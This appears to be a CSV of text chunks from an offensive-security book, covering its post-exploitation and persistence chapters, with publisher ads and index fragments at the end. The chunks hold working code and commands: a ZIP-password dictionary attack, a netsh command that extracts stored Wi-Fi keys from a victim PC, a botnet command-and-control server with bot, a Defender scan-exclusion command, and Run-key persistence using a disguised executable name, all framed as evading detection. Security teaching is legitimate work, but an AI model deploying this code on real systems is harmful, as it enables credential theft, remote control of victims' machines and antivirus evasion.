filename,page_number,chunk_number,chunk
Python Ethical Hacking from Scratch.pdf,183,3,"er that you are using for your hacker program and save the settings. Now you are done, and you can carry out attacks over a public IP as well. This will help you attack victims that are not located in your local network. Cracking passwords In this section, we will learn how to crack password-protected files using a password database. We will try to crack a ZIP file in this section. A ZIP file is a binary format that stores files in compressed format and can be password protected. We will carry out a dictionary"
Python Ethical Hacking from Scratch.pdf,183,4, attack. Let's first learn what a dictionary attack is! A dictionary attack is an attack in which a hacker tries to guess the victim's password by using a set of predefined passwords. They usually have a very large database of passwords stored in a file and try to use one of the passwords to see if the victim's password matches the password list. This password list is usually obtained from a leak of passwords from a compromised website and other forums. This is why you should never reuse a password for one web
Python Ethical Hacking from Scratch.pdf,183,5,"site more than once. If you use the same password for a website and the website gets compromised, chances are that all your passwords could be compromised. Y ou can find a list of the most widely used passwords here: https://github.com/ danielmiessler/SecLists. This list contains around 10 million passwords and is updated regularly. If a user uses a password that is stored in this file, you can easily crack it. I have downloaded a file from the previously mentioned GitHub repo. Let's take a look at its contents."
Python Ethical Hacking from Scratch.pdf,184,1,"Cracking passwords 171 Create a new project and store this password file from the repo in the project. Also, copy the password-protected ZIP file to the project. I have created a dummy file called secret file.txt , w"
Python Ethical Hacking from Scratch.pdf,184,2,"hich is password-protected in ZIP format. The password is qwerty , which is located in the password database file as well. The password file looks like this: Figure 8.18 – Password database file To crack the file, we"
Python Ethical Hacking from Scratch.pdf,184,3," will need the zipfile Python library, which is a part of the Python standard package, so we don't need to install it. Import this into your script using the following: import zipfile encrypted_filename= ""secret file"
Python Ethical Hacking from Scratch.pdf,184,4,".zip"" zFile = zipfile.ZipFile(encrypted_filename) We will create a ZIP file object and pass the encrypted filename to it. Next, we need to open the password database file as well, in read mode so that we can match th"
Python Ethical Hacking from Scratch.pdf,184,5,"e passwords: passFile = open(""passwords.txt"", ""r"") for line in passFile.readlines(): test_password = line.strip(""\n"").encode('utf-8') try: print(test_password) zFile.extractall(pwd=test_password) print(""Match found"")"
Python Ethical Hacking from Scratch.pdf,185,1,"172 Post Exploitation break except Exception as err: pass In the previous code, we read the passwords one by one and tested them. Note that in order to test a password, it should be in binary form instead of string format. If the password doesn't match, we simply raise an exception and move to the next password. If it matches"
Python Ethical Hacking from Scratch.pdf,185,2,", we print the Match found statement and break the loop and if we look at the directory you will see that a new folder will be created, which will contain an unencrypted file: Figure 8.19 – Password cracking Here we are testing various passwords and when the password matches, we extract the file and break the loop, as you can"
Python Ethical Hacking from Scratch.pdf,185,3," clearly see that the password is qwerty . In this section, we have learned how to crack password-protected files. In the next section, we will learn how to create botnets and how they can be useful to us. Stealing passwords In this section, we will see how we can steal Wi-Fi passwords stored on the victim PC. Note that we ha"
Python Ethical Hacking from Scratch.pdf,185,4,"ve already discussed how to execute commands on a Windows machine using our hacker program. We can take advantage of this program to retrieve Wi-Fi passwords. Note that you may not have a Wi-Fi driver installed on your virtual OS. I have this driver installed. If you want, you can use your host PC for this purpose. In order t"
Python Ethical Hacking from Scratch.pdf,185,5,"o access the stored access points on the victim machine, you need to run the following command: netsh wlan show profiles If you run this command in your Command Prompt, you will see all the access points you have connected with your PC. But we want to access the passwords, not the access points. Here is the screenshot for my PC:"
Python Ethical Hacking from Scratch.pdf,186,1,Stealing passwords 173 Figure 8.20 – Connected access points In order t
Python Ethical Hacking from Scratch.pdf,186,2,"o get the passwords, you have to write the name of the access point and"
Python Ethical Hacking from Scratch.pdf,186,3," give an additional parameter, key=clear , to the command. The complete"
Python Ethical Hacking from Scratch.pdf,186,4," command will look like this: netsh wlan show profiles ""POCO X3 NFC"" ke"
Python Ethical Hacking from Scratch.pdf,186,5,y=clear Y ou will see a similar output: Figure 8.21 – Retrieving passwords
Python Ethical Hacking from Scratch.pdf,187,1,"174 Post Exploitation The last field in Security settings is the password for this access point in plain text. Y ou can run these commands with your malware program as well if you have a Wi-Fi driver installed on your virtual OS (Windows). Creating botnets In Chapter 7, Advanced Malware , we developed a malware program that can contain one hacker and one victim program. This is useful when you want to carry"
Python Ethical Hacking from Scratch.pdf,187,2," out an attack on one specific target. However, in a lot of cases, you would want to have one command and control center for the hacker and a lot of victim programs running on different machines and communicating with one hacker program, with the hacker being able to control these devices remotely. These are what we call botnets. Botnets are small programs that run on different machines and communicate with"
Python Ethical Hacking from Scratch.pdf,187,3," one command-and-control center. They are used for a lot of malicious purposes, such as Distributed Denial of Service (DDoS ) attacks, where you make a certain website go offline by generating millions of requests at a time or use the resources of computers to mine cryptocurrency, and so on. Let's start creating our own botnet and then create different bots to communicate with the command-and-control center"
Python Ethical Hacking from Scratch.pdf,187,4,". We will write two programs: one will be called CnC.py for the command-and-control center. This will serve the same purpose as a hacker program. The other will be called bot1.py . Y ou can create any number of bots that you want, however, for illustration purposes, I will create only one bot. Create a new project called bots and create a new Python file called CnC.py . This should be created on a Kali mach"
Python Ethical Hacking from Scratch.pdf,187,5,"ine. We will need the same socket library we used before. Let's start with our imports: import socket from threading import Thread import time Since we want to create a number of bots, we are using threads for each different bot. Threads are used to create a separate thread that runs concurrently. Next, we will create a list of threads and clients. The client will be bots in our case: threads = [] clients = []"
Python Ethical Hacking from Scratch.pdf,188,1,"Creating botnets 175 Next, we will create a function called listen_for_bots() , which, as the name indicates, will listen for incoming bot connections: def listen_for_bots(port): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.bind(("""", port)) sock.listen()"
Python Ethical Hacking from Scratch.pdf,188,2," bot, bot_address = sock.accept() clients.append(bot) This is quite similar to what we did earlier while writing the hacker program. The only difference is that once the client is connected, we add it to the client list so that we can use this connection for various purp"
Python Ethical Hacking from Scratch.pdf,188,3,"oses as we did with the hacker program. Now we define a main() function where all our logic will reside: def main(): print(""[+] Server bot waiting for incoming connections"") startig_port = 8085 bots = 3 We define the port that we want to use. Note that this is a starting"
Python Ethical Hacking from Scratch.pdf,188,4,"_port and we will use different ports for different clients. We will simply add 1 to this number for each new client. The variable bots=3 suggests that we want to connect only three bots, however, you can add as many clients as you want: for i in range(bots): t = Thread("
Python Ethical Hacking from Scratch.pdf,188,5,"target=listen_for_bots, args=(i + startig_ port,), daemon=True) threads.append(t) t.start() Next, we will run these threads in a loop. Daemon=True means that we want to run these as a background process. Then we append each thread to a list so that we can access the thread."
Python Ethical Hacking from Scratch.pdf,189,1,"176 Post Exploitation Next, we will run a loop for the command-and-control center. While the clients are connected, we will display the clients and ask the hacker to select the client they want to interact with. Next, we run an internal loop for each bot"
Python Ethical Hacking from Scratch.pdf,189,2,", which will help us send messages to each bot individually by accessing the element in the list. Here you can define your own logic for a bot. Y ou can send commands over to the bot and run those commands on the PC that the bot is running on. The rest i"
Python Ethical Hacking from Scratch.pdf,189,3,"s left up to you to define the functionality as you want. Here we are simply sending a message. Once you have achieved your objective, you can remove the client from the list: run_cnc = True while run_cnc: if len(clients) != 0: for i, c in enumerate(clie"
Python Ethical Hacking from Scratch.pdf,189,4,"nts): print(""\t\t"", i, ""\t"", c.getpeername()) selected_client = int(input(""[+] Select client by index: "")) bot = clients[selected_client] run_bot = True while run_bot: msg = input(""[+] Enter Msg: "") msg = msg.encode() bot.send(msg) if msg.decode() == ""ex"
Python Ethical Hacking from Scratch.pdf,189,5,"it"": run_bot = False status = bot.recv(1024) if status == ""disconnected"".encode(): bot.close() clients.remove(bot) print(""data sent"") else: print(""[+] No clients connected"") ans = input(""[+] Do you want to exit? press [y/n] "") if ans == ""y"": run_cnc = False"
Python Ethical Hacking from Scratch.pdf,190,1,Creating botnets 177 else: run_cnc = True Now we have defined a basic structure for the command-and-control center. The complete code for the bot can be found at the following link: https://github.com/PacktPublishing/Python-Ethical-Hacking/ blob/main/example13-CNC/CnC.py
Python Ethical Hacking from Scratch.pdf,190,2," Next, we will define the logic for our bot. Go to the victim computer and create a new file called bot1.py . We will create a socket object and try to communicate with the hacker using the hacker's IP . This step is similar to the malware program we developed earlier: i"
Python Ethical Hacking from Scratch.pdf,190,3,"mport socket if __name__ == ""__main__"": print(""[+] Connecting with server"") s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((""192.168.0.11"", 8085)) Next, we will create a loop for run_bot and try to receive messages that the CNC is sending and once the me"
Python Ethical Hacking from Scratch.pdf,190,4,"ssage is received, you can define your own logic here. Here we will simply print the message, but you can add functionality to your liking. Once the CNC sends an exit message, we can simply disconnect the client bot from the server. The code is listed as follows: run_bot"
Python Ethical Hacking from Scratch.pdf,190,5," = True while run_bot: communicate_bot = True while communicate_bot: msg = s.recv(1024) msg = msg.decode() print(""command center said: "", msg) if msg == ""exit"": communicate_bot = False # ans = input(""[+] do you want to remain connected: "") ans = ""connected"" if ans == ""no"":"
Python Ethical Hacking from Scratch.pdf,191,1,"178 Post Exploitation status = ""disconnected"" s.send(status.encode()) run_bot = False else: status = ""conntected"".encode() s.send(status) s.close() The complete code for bot1.py is given at the following link: https://github.com/PacktPublishing/Python-Ethical-Hacking/ blob/main/example13-C"
Python Ethical Hacking from Scratch.pdf,191,2,"NC/bot1.py In this section, we have learned how to create a command-and-control center for bot net clients. Y ou can add any number of clients you want and control them all together with your CNC program. Summary In this chapter, we learned about some methods for how to successfully deploy"
Python Ethical Hacking from Scratch.pdf,191,3, your malware programs. An important aspect of a malware program is how stealthy it is. This chapter focused on hiding your malware inside images. We learned about malware attacks over a public IP and how a hacker can attack victims that are not present in the same network as the victim. W
Python Ethical Hacking from Scratch.pdf,191,4,"e then learned how to crack a password-protected file using a dictionary attack. Lastly, we learned how to create a command-and-control center for botnet-based attacks. These attacks allow the hacker to control a large number of distributed devices with only one program. After going throug"
Python Ethical Hacking from Scratch.pdf,191,5,"h this chapter, you should be able to create trojans, perform attacks over a public IP , and create your own botnets. In the next chapter, we will learn how you can protect your online identity as a hacker and how important this aspect is to a successful attack. See you in the next chapter!"
Python Ethical Hacking from Scratch.pdf,192,1,"9 System Protection and Perseverance In this chapter, we are going to focus our attention on how defense mechanisms w"
Python Ethical Hacking from Scratch.pdf,192,2,"ork and by understanding how they work, you can learn what techniques you can use to bypass them. We will start by le"
Python Ethical Hacking from Scratch.pdf,192,3,"arning about intrusion detection systems and their different types. After that, we will learn about detection mechani"
Python Ethical Hacking from Scratch.pdf,192,4,"sms. Once we understand these mechanisms, we will try to bypass them using our tools. In summary, this chapter will f"
Python Ethical Hacking from Scratch.pdf,192,5,ocus on the following topics: • System protection • Intrusion detection methods • Detection mechanisms • Bypassing IDSes
Python Ethical Hacking from Scratch.pdf,193,1,"180 System Protection and Perseverance Persistence system protection Our previous chapters focused on creating malware and carrying out different attacks. This is the offensive side of attacks. However, in real-life hacking, you need to know how to protect yourself against external attacks. A better understanding of protection mechanisms would help you to not only protect yourself, but this knowledge "
Python Ethical Hacking from Scratch.pdf,193,2,"would also help you to carry out successful attacks. The first line of defense against external network attacks, or system attacks in general, is the Intrusion Detection System (IDS). IDS is an umbrella term for a lot of tools used for system security and protection, so we must learn about them in detail. Intrusiondetectionsystems IDSes are a system that monitor and detect the components of your ne"
Python Ethical Hacking from Scratch.pdf,193,3,"twork or system on a continuous basis to detect any undesirable or suspicious behavior. The goal of an IDS is to prevent any undesirable scenario in a system. Fundamentally, there are three types of IDS: • Host-based IDSes • Network-based IDSes • Hybrid IDSes Let's discuss these in detail in the following sections. Host-basedIDSes Host-based IDSes run on the system they are monitoring. Along with oth"
Python Ethical Hacking from Scratch.pdf,193,4,"er software, host-based IDSes monitor the filesystem to scan for any potentially harmful files. They also monitor and analyze network traffic to see whether any malicious traffic is occurring over the network. Host-based IDSes are an important part of a system's security apparatus; however, they often do not give complete details regarding the security state of the system. They can be modified and eve"
Python Ethical Hacking from Scratch.pdf,193,5,n bypassed by different attacks. An important aspect of a host-based IDS is how up to date it is in terms of modern threat detection. It should constantly keep up with the modern threats and block them immediately if it detects them. An important feature of a host-based IDS is to keep a log of all critical activities occurring on a system. This can help a lot in threat detection and incidence response.
Python Ethical Hacking from Scratch.pdf,194,1,"Persistence system protection 181 On most common OSes, you have some sort of host-based IDS already built in. In a Windows OS, Windows built-in antivirus is part of the host IDS. It monitors and detects any suspicious activity on the system and blocks potential threats from acting on a system. Along with virus det"
Python Ethical Hacking from Scratch.pdf,194,2,"ection, it also works to detect any tampering of critical Windows infrastructure. Network-basedIDSes Another important aspect of system security is network-based protection. Network-based IDSes play a key role in limiting external network attacks from taking place. They play a role in protecting all devices prese"
Python Ethical Hacking from Scratch.pdf,194,3,"nt in a network. It observes network traffic over the whole subnet to monitor suspicious activity. It can be combined with firewalls to provide additional security. Sometimes, network-wide firewalls are part of an IDS. HybridIDSes As the name suggests, these detection systems provide much more security for the sy"
Python Ethical Hacking from Scratch.pdf,194,4,stem as compared with individual systems. They combined both system-based and network- based approaches to catch malicious behavior and have a much higher rate of detection. Modern hybrid IDSes use both conventional and artificial intelligence (AI)-based techniques to prevent network attacks. Now that we have lear
Python Ethical Hacking from Scratch.pdf,194,5,"ned about different types of IDS, let's see how these IDSes work. IDSdetectionmechanisms Most common IDSes work by using the following two fundamental techniques, although modern IDSes use much more sophisticated approaches. Let's take a look at different detection mechanisms and how they are used in real systems."
Python Ethical Hacking from Scratch.pdf,195,1,"182 System Protection and Perseverance Signature-baseddetection This is a classical knowledge-based approach and has been used since the early days of computer security. In this approach, the protection softwa"
Python Ethical Hacking from Scratch.pdf,195,2,"re has access to a large known database of malware. Using the database, it can see what bytes are present in the malware, and then it simply compares any new file introduced to the system with this byte sequenc"
Python Ethical Hacking from Scratch.pdf,195,3,"e. If the byte sequence of an unknown file matches with the byte sequence present in the database, this means that the unknown file is most probably malicious, and it will immediately block this file. Otherwise"
Python Ethical Hacking from Scratch.pdf,195,4,", it will continue with normal operations. The algorithm looks like this in its simplest form: Figure 9.1 – Signature-based detection mechanism Signature-based detection works great for known malware, so a good"
Python Ethical Hacking from Scratch.pdf,195,5, IDS must have a larger malware database. This method is only going to be as good as the database it has for testing. Newly written malware that has not yet been detected will give a false negative for this test.
Python Ethical Hacking from Scratch.pdf,196,1,"Bypassing an IDS 183 Anomaly-baseddetection These detection systems work differently to the signature-based approach. They monitor the activities that a program undertakes. It defines certain scenarios that it regards as normal behavior and then looks for any anomaly in these behaviors. For example, a game software should not try to disable the antivirus system. Once a malware program tries to do something it is not supposed to, these systems flag these programs as suspicious and keep monitoring the"
Python Ethical Hacking from Scratch.pdf,196,2,"m until they detect that a program is trying to perform something it absolutely shouldn't. Once it detects suspicious behavior, it would either block the program altogether or generate a red alert for the administrator. Note that there is a small difference between IDSes and Intrusion Prevention Systems (IPSes). For practical purposes, most of the time, these tasks are performed by the same piece of software and we don't make any practical distinction between them. Occasionally, however, you will see"
Python Ethical Hacking from Scratch.pdf,196,3," that IDSes and IPSes are mentioned separately, so you should know the difference between them. Now that we have learned what an IDS is and how it works, we can start building a program to learn how to bypass these systems. Bypassing an IDS In Chapter 6, Malware Development , and Chapter 7, Advanced Malware , we developed our malware program, and in Chapter 8, Post Exploitation , we learned how to package our malware into a trojan. Our malware works great and most probably will not be detected by the"
Python Ethical Hacking from Scratch.pdf,196,4," IDS if it is using a signature-based approach since the malware is written by you and no signature exists for your program anywhere. However, modern IDSes are quite clever and after a couple of runs, they will start noting suspicious behaviors for which they use very exhaustive methods. In this section, we will try to see how we can run our Python executable and administrator privileges. This will help to achieve certain tasks on the victim's machine that a normal executable will not be able to do. "
Python Ethical Hacking from Scratch.pdf,196,5,"For example, disabling the antivirus program on Windows, or creating an exception for a certain folder so that the virus scanner doesn't scan it, requires administrator privileges in Windows. Y ou can't perform activities such as this with a normal executable. Let's see first how we can run an executable with administrator privileges . Y ou can use this method in combination with your malware program. However, for the sake of simplicity, I will use a simple Python script to demonstrate this procedure."
Python Ethical Hacking from Scratch.pdf,197,1,"184 System Protection and Perseverance Let's create a new Python script. Create a new virtual environment as well. There are multiple ways to elevate privileges for a Python program and you will find multiple solutions online. However, the simplest solution I have found is to use a library called elevate . Since we w"
Python Ethical Hacking from Scratch.pdf,197,2,"ill be creating an executable for demo purposes, let's install pyinstaller as well. Once you have created a new project and installed pyinstaller in the virtual environment, let's run the following line to download the elevate Python module: pip install elevate Once this package is installed, you can use it inside yo"
Python Ethical Hacking from Scratch.pdf,197,3,"ur code to increase privileges for your executable. In my experience, I have found out that it is a good idea to put this functionality at the start of your script to get the best results. To elevate privileges for the script, you can simply call the elevate function from this module. Let's try to first see what the "
Python Ethical Hacking from Scratch.pdf,197,4,"user privilege level is before we use this module. Simply write the following code to test. We can use the os module to check for root privileges: import ctypes import platform def is_root(): if platform.system() == ""Windows"": return ctypes.windll.shell32.IsUserAnAdmin() else: return 1 print(is_root()) Y ou can use t"
Python Ethical Hacking from Scratch.pdf,197,5,"he preceding code to see whether the program is running in elevated mode. If the value returned by the previous code is 1, this means it is being run as an administrator , otherwise it is running in non-administrator mode. Let's run the previous program to see the execution mode: Figure 9.2 – No administrator privileges"
Python Ethical Hacking from Scratch.pdf,198,1,"Bypassing an IDS 185 Now, to elevate, you can simply call the elevate() method. Note that there is a small caveat in how privilege escalation works in Windows. When a call to elevate() is made, instead of running the sam"
Python Ethical Hacking from Scratch.pdf,198,2,"e script as administrator , Windows restarts the same script as a separate process with higher privileges. There is no workaround for this yet. So, when the call to elevate is made, a new process will start. Let's begin "
Python Ethical Hacking from Scratch.pdf,198,3,"by elevating privileges: import ctypes import platform import time from elevate import elevate def is_root(): if platform.system() == ""Windows"": return ctypes.windll.shell32.IsUserAnAdmin() else: return 1 print(is_root()"
Python Ethical Hacking from Scratch.pdf,198,4,") elevate() print(is_root()) Let's now create an executable, (as we did in Chapter 8, Post Exploitation , in the Packaging malware section) as well to see all of this in action. To run the program, double-click on the ex"
Python Ethical Hacking from Scratch.pdf,198,5,"ecutable created. Y ou will see the following popup asking the user to click Ye s to escalate privileges. If the user clicks Ye s , the program will run in administrator mode: Figure 9.3 – UAC (user account control) popup"
Python Ethical Hacking from Scratch.pdf,199,1,"186 System Protection and Perseverance Press Ye s and you will see the following screen, indicating that a new process has been created and is running with higher privileges, indicated by 1: Figure 9.4 – Admin privileges Now that we have learned ho"
Python Ethical Hacking from Scratch.pdf,199,2,"w to run our script as an administrator , let's see how we can modify Windows settings to add exceptions to the IDS scanning. We will add a directory to the Windows exception rules. This will allow us to skip virus scanning for a certain directory "
Python Ethical Hacking from Scratch.pdf,199,3,and will help us to plant malware in that directory. The complete code to elevate privileges is present at the following link: https:// github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/ example14-priv-escalation/escalation.py . In the pr
Python Ethical Hacking from Scratch.pdf,199,4,"evious program, we first elevate privileges and then add an exception to the folder where our malware is present in Windows defender settings. This will skip the scanning of the current folder. The following code achieves this: objective.d : comman"
Python Ethical Hacking from Scratch.pdf,199,5,"d = ""Add-MpPreference -ExclusionPath "" + dir_to_add all_commands.append(command) The previous line adds an exception to the Microsoft Defender scanning repositories, as shown in the following screenshot: Figure 9.5 – Added exclusion for virus scanning"
Python Ethical Hacking from Scratch.pdf,200,1,"Persistence 187 Now we know how to make our program run in stealth mode and avoid detection by an IDS. Next, we will add persistence to our program. This will allow our program to run when Windows starts up so that a user doesn't have to click on the malware program every time in order for us to have a reverse connection. The victim will only click on the malware once and we will add a Window"
Python Ethical Hacking from Scratch.pdf,200,2,"s registry key for the start up program so that every time the computer is started, our malware program will run. Y ou can use this method on the victim program we developed earlier. Here, for the sake of simplicity, I will just use a demo script. Persistence In this section, we will learn how to run our Python script when starting up Windows. Let's create a new project. Y ou can also modify "
Python Ethical Hacking from Scratch.pdf,200,3,"the victim program that we developed earlier in Chapter 6, Malware Development , and Chapter 7, Advanced Malware . To add persistence to our program, we need to know exactly the name of the executable we are running. Once we know the executable, we can make a copy of this executable somewhere else and run it from there every time the system boots. This sounds complicated, so let's take a look"
Python Ethical Hacking from Scratch.pdf,200,4," at it bit by bit. First, we will need to know the name of the executable. To find this out, let's write the following code: import sys curr_executable = sys.executable print(""Current executable : "", curr_executable) The output of the aforementioned program if you run it as a Python script would be as follows: Figure 9.6 – Current interpreter name This only tells us the name of the Python int"
Python Ethical Hacking from Scratch.pdf,200,5,erpreter and not the name of the executable that we need. Why is that? Because we are only running a script at the moment. The only way to get the actual name of the executable when we run the file as a binary executable is by using pyinstaller . Create a binary executable and run the executable by double- clicking it. Take a look at the following screenshot: Figure 9.7 – Actual executable name
Python Ethical Hacking from Scratch.pdf,201,1,"188 System Protection and Perseverance Y ou can see that now we are getting the actual executable name that we need. The next step is to create a copy of this executable and store it somewhere else so that it is hidden from the victim and finally add a registry to the start up applications. We will copy this executable to the AppData folder on Windows, "
Python Ethical Hacking from Scratch.pdf,201,2,"which is a special folder that contains application data. To get the path of the appdata folder, you can write the following code: app_data = os.getenv(""APPDATA"") Let's rename the executable so it doesn't look suspicious. We will call this executable system32_data.exe . This is a made-up name and you can use any name you want: to_save_file = app_data +"""
Python Ethical Hacking from Scratch.pdf,201,3,"\\""+""system32_data.exe"" Next, copy the current executable to appdata and rename it. We will need to import the shutil module from the Python standard library: shutil.copyfile(curr_executable, to_save_file) To add it to the Windows registry at startup, you need to run the following code: key = winreg.HKEY_CURRENT_USER # ""Software\Microsoft\Windows\Curren"
Python Ethical Hacking from Scratch.pdf,201,4,"tVersion\Run"" key_value = ""Software\\Microsoft\\Windows\\ CurrentVersion\\Run"" key_obj = winreg.OpenKey(key, key_value, 0, winreg. KEY_ALL_ACCESS) winreg.SetValueEx(key_obj, ""systemfilex64"", 0, winreg. REG_SZ, to_save_file) winreg.CloseKey(key_obj) This code simply adds the to_save_file string, which contains the executable name to the start up registry"
Python Ethical Hacking from Scratch.pdf,201,5,". To make changes to the program, you need to run this executable in administrator mode, so you can copy the code from the previous section and add it to the start of this script. The complete code is linked here: if not os.path.exists(to_save_file): print(""Becoming Persistent"") shutil.copyfile(curr_executable, to_save_file) key = winreg.HKEY_CURRENT_USER"
Python Ethical Hacking from Scratch.pdf,202,1,"Persistence 189 # ""Software\Microsoft\Windows\CurrentVersion\Run"" key_value = ""Software\\Microsoft\\Windows\\CurrentVersion\\ Run"" key_obj = winreg.OpenK"
Python Ethical Hacking from Scratch.pdf,202,2,"ey(key, key_value, 0, winreg.KEY_ALL_ ACCESS) winreg.SetValueEx(key_obj, ""systemfilex64"", 0, winreg.REG_ SZ, to_save_file) winreg.CloseKey(key_obj) else:"
Python Ethical Hacking from Scratch.pdf,202,3," print(""path doesnt exist"") After running the code, if you go to the appdata folder, you will see the following executable: Figure 9.8 – Current executab"
Python Ethical Hacking from Scratch.pdf,202,4,"le copied to the appdata folder Also, to verify whether the Windows registry has been modified, open the registry editor by searching for regedit in a Wi"
Python Ethical Hacking from Scratch.pdf,202,5,"ndows search. Open it and go to the following path: ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\ CurrentVersion\\Run"" : Figure 9.9 – Edited registry"
Python Ethical Hacking from Scratch.pdf,203,1,"190 System Protection and Perseverance The final row is the entry we just added. Y ou can see that the Data field in the preceding screenshot links to the executable we just copied. Now, if you restart the PC, you will see that once the system boots up, the aforemention"
Python Ethical Hacking from Scratch.pdf,203,2,"ed executable will be started automatically. By way of practice, try to replicate the same procedure with the victim malware program. Y ou should be able to get a return connection from the victim's machine when the victim boots up their computer. Summary In this chapte"
Python Ethical Hacking from Scratch.pdf,203,3,"r, we learned different system protection techniques. We started by getting an understanding of system protection and how different IDSes/IPSes work. We learned about different types of detection mechanisms. We also learned about using executables with elevated privileg"
Python Ethical Hacking from Scratch.pdf,203,4,"es. Finally, we learned how to make our executables persistent. This knowledge, combined with things you learned in previous chapters, will allow you to develop your malware tools without being easily detected. As long as you keep the impact of your malware on the syste"
Python Ethical Hacking from Scratch.pdf,203,5,"m low, it would not be easy for an IDS to detect your malware. I hope you learned a lot and enjoyed this book! Remember that cybersecurity is an everchanging field and you need to be constantly up to date with modern tools in order to become a successful penetration tester."
Python Ethical Hacking from Scratch.pdf,204,1,"Packt.com Subscribe to our online digital library for full access to over 7,000 books and videos, as well as industry leading tools to help you plan your personal development and advance your career. For more informa"
Python Ethical Hacking from Scratch.pdf,204,2,"tion, please visit our website. Why subscribe? • Spend less time learning and more time coding with practical eBooks and Videos from over 4,000 industry professionals • Improve your learning with Skill Plans built es"
Python Ethical Hacking from Scratch.pdf,204,3,"pecially for you • Get a free eBook or video every month • Fully searchable for easy access to vital information • Copy and paste, print, and bookmark content Did you know that Packt offers eBook versions of every bo"
Python Ethical Hacking from Scratch.pdf,204,4,"ok published, with PDF and ePub files available? Y ou can upgrade to the eBook version at packt.com and as a print book customer, you are entitled to a discount on the eBook copy. Get in touch with us at customercare"
Python Ethical Hacking from Scratch.pdf,204,5,"@packtpub.com for more details. At www.packt.com , you can also read a collection of free technical articles, sign up for a range of free newsletters, and receive exclusive discounts and offers on Packt books and eBooks."
Python Ethical Hacking from Scratch.pdf,205,1,"192 Other Books Y ou May Enjoy Other Books You May Enjoy If you enjoyed this book, you may be interested in these other books by Packt:"
Python Ethical Hacking from Scratch.pdf,205,2, Mastering Python for Networking and Security - Second Edition José Manuel Ortega ISBN: 978-1-83921-716-6 • Create scripts in Python to
Python Ethical Hacking from Scratch.pdf,205,3, automate security and pentesting tasks • Explore Python programming tools that are used in network security processes • Automate tasks
Python Ethical Hacking from Scratch.pdf,205,4, such as analyzing and extracting information from servers • Understand how to detect server vulnerabilities and analyze security modul
Python Ethical Hacking from Scratch.pdf,205,5,es • Discover ways to connect to and get information from the Tor network • Focus on how to extract information with Python forensics tools
Python Ethical Hacking from Scratch.pdf,206,1,Why subscribe? 193 Mastering Python Networking - Third Edition Eric Chou ISBN: 978-1-83921-467-7 • Use Python libraries to 
Python Ethical Hacking from Scratch.pdf,206,2,"interact with your network • Integrate Ansible 2.8 using Python to control Cisco, Juniper, and Arista network devices • Lev"
Python Ethical Hacking from Scratch.pdf,206,3,erage existing Flask web frameworks to construct high-level APIs • Learn how to build virtual networks in the AWS & Azure C
Python Ethical Hacking from Scratch.pdf,206,4,loud • Learn how to use Elastic Stack for network data analysis • Understand how Jenkins can be used to automatically deplo
Python Ethical Hacking from Scratch.pdf,206,5,y changes in your network • Use PyTest and Unittest for Test-Driven Network Development in networking engineering with Python
Python Ethical Hacking from Scratch.pdf,207,1,"194 Packt is searching for authors like you If you're interested in becoming an author for Packt, please visit authors. packtpub.com and apply today. We have worked with thousands of developers and tech professionals, "
Python Ethical Hacking from Scratch.pdf,207,2,"just like you, to help them share their insight with the global tech community. Y ou can make a general application, apply for a specific hot topic that we are recruiting an author for, or submit your own idea. Leave a"
Python Ethical Hacking from Scratch.pdf,207,3," review - let other readers know what you think Please share your thoughts on this book with others by leaving a review on the site that you bought it from. If you purchased the book from Amazon, please leave us an hon"
Python Ethical Hacking from Scratch.pdf,207,4,"est review on this book's Amazon page. This is vital so that other potential readers can see and use your unbiased opinion to make purchasing decisions, we can understand what our customers think about our products, an"
Python Ethical Hacking from Scratch.pdf,207,5,"d our authors can see your feedback on the title that they have worked with Packt to create. It will only take a few minutes of your time, but is valuable to other potential customers, our authors, and Packt. Thank you!"
Python Ethical Hacking from Scratch.pdf,208,1,"Index A Access Point (AP) 53 active reconnaissance 20 active reconnaissance, information IP address 20 MAC address 20 operating system fingerprinting 20 ports 20 services/software "
Python Ethical Hacking from Scratch.pdf,208,2,"running on target machine 20 Address Resolution Protocol (ARP) about 86 need for 94 poisoning 94-97 tables, restoring manually 106, 107 American Standard Code for Information Inter"
Python Ethical Hacking from Scratch.pdf,208,3,"change (ASCII) 72 anomaly-based detection 182, 183 application header 74 Application Programming Interface (API) 120 ARP scanner with Scapy 87-90 ARP spoof program building 98 proj"
